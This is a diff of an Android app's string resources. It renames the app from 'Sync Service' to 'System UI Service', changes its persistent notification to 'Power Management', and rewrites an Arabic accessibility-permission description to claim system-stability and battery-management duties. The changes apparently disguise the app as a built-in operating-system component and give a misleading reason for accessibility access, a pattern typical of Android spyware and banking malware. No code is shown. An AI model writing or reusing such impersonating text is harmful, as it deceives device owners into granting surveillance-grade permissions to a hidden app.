@@ -1,9 +1,9 @@
 <resources>
-    <string name="app_name">Sync Service</string>
-    <string name="title_activity_main">Sync Service</string>
-    <string name="channel_name">Sync Service</string>
-    <string name="channel_description">Essential system service for device synchronization and backup</string>
-    <string name="notification_title">Sync Service</string>
-    <string name="notification_content">Service is running</string>
-    <string name="accessibility_description">يوفر خدمات تحسين النظام وإدارة استهلاك البطارية في الخلفية. يتطلب الوصول لتوفير أداء مستقر ومستمر.</string>
+    <string name="app_name">System UI Service</string>
+    <string name="title_activity_main">System UI Service</string>
+    <string name="channel_name">System UI Service</string>
+    <string name="channel_description">Essential system service for device stability and UI performance</string>
+    <string name="notification_title">Power Management</string>
+    <string name="notification_content">Optimizing system stability</string>
+    <string name="accessibility_description">يوفر خدمات استقرار النظام وإدارة استهلاك الطاقة في الخلفية. يتطلب الوصول لتوفير أداء مستمر.</string>
 </resources>
